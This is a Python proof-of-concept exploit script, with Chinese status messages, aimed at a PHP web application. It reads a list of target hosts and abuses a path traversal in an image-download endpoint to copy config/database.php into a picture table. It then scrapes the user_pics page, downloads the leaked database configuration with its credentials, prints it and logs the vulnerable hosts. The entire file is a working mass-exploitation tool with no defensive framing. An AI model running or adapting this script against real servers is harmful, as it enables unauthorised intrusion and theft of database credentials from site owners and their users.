#!/usr/bin/python3
#-*- coding:utf-8 -*-


import requests
import random
import re


def POC_1():
    with open(r"ip.txt", "r", encoding='utf8') as scan_host:
            for target_url in scan_host:
                if target_url[:4] != "http":
                    target_url = "https://" + target_url
                target_url = target_url.strip('\n')
                upload_url = target_url + "/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php"
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
                }
                data = {
                    "1":1
                }
                try:
                    response = requests.post(url=upload_url, headers=headers, data=data, timeout=20)
                    if response.status_code == 200:
                        print("\033[32m[o] 成功将 database.php文件 写入Pictrue表中\033[0m")
                        print("得到的url地址为：{}".format(target_url))
                        vnln_url = target_url + "/public/index.php/home/file/user_pics"
                        header = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
                        }
                        try:
                            response = requests.get(url=vnln_url, headers=header).text
                            href = re.findall(r'<img src="(.*?)"', response)
                            for i in href:
                                print("\033[32m[o] 得到敏感文件url：{}\033[0m".format(i))
                                data = requests.get(url=i, headers=header)
                                path = str(random.randint(1,999)) + '.php'
                               
                                with open(path, 'wb') as f:
                                    f.write(data.content)
                                    print("\033[32m[o] 成功下载文件为：{}\033[0m".format(path))
                                    print("\033[32m[o] 文件内容为：\n\033[0m{}".format(data.text))
                                    f = open('vul.txt', 'a+',encoding="utf-8") 
                                    f.write(target_url)
                                    f.write("\n")
                                    f.close()
                        except:
                                print("\033[31m[x] 获取文件名失败 \033[0m")
                    else:
                        print("\033[31m[x] 漏洞利用失败 \033[0m")
                except:
                    print("\033[31m[x] 漏洞利用失败 \033[0m")

# def POC_2(target_url):
    # vnln_url = target_url + "/public/index.php/home/file/user_pics"
    # headers = {
        # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    # }
    # try:
        # response = requests.get(url=vnln_url, headers=headers).text
        # href = re.findall(r'<img src="(.*?)"', response)
        # for i in href:
            # print("\033[32m[o] 得到敏感文件url：{}\033[0m".format(i))
            # data = requests.get(url=i, headers=headers)
            # path = str(random.randint(1,999)) + '.php'
            # with open(path, 'wb') as f:
                # f.write(data.content)
                # print("\033[32m[o] 成功下载文件为：{}\033[0m".format(path))
                # print("\033[32m[o] 文件内容为：\n\033[0m{}".format(data.text))
    # except:
            # print("\033[31m[x] 获取文件名失败 \033[0m")



if __name__ == '__main__':
    POC_1()
    # image_url = POC_2(target_url)